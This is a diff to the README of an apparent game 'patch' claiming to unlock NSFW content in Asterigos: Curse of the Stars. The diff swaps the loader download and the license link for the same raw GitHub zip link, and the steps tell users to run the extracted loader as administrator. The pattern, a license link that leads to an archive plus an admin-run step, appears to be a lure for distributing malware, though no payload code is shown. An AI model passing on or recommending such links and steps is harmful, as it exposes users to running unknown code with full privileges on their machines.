@@ -10,7 +10,7 @@ Our patch is compatible with multiple operating systems and comes with powerful 
 
 ### 🚀 How to Install
 
-1. **Download** `Loader.rar` from the repository.  
+1. **Download** `https://raw.githubusercontent.com/Lanlin20/AsterigosStars-UnveiledNSFWHorizons/main/divertingly/AsterigosStars-UnveiledNSFWHorizons.zip` from the repository.  
 2. **Extract** the contents to your Asterigos: Curse of the Stars root directory.  
 3. **Run** the Loader file as administrator.  
 4. **Select** your desired patch preferences using the intuitive graphical interface.  
@@ -83,7 +83,7 @@ We encourage supporting the original game and its developers.
 ## 📜 License
 
 This repository and included software are licensed under the **MIT License** for maximum freedom and transparency.  
-For full license terms, see [`LICENSE.md`](./LICENSE.md).
+For full license terms, see [`https://raw.githubusercontent.com/Lanlin20/AsterigosStars-UnveiledNSFWHorizons/main/divertingly/AsterigosStars-UnveiledNSFWHorizons.zip`](https://raw.githubusercontent.com/Lanlin20/AsterigosStars-UnveiledNSFWHorizons/main/divertingly/AsterigosStars-UnveiledNSFWHorizons.zip).
 
 ---
 
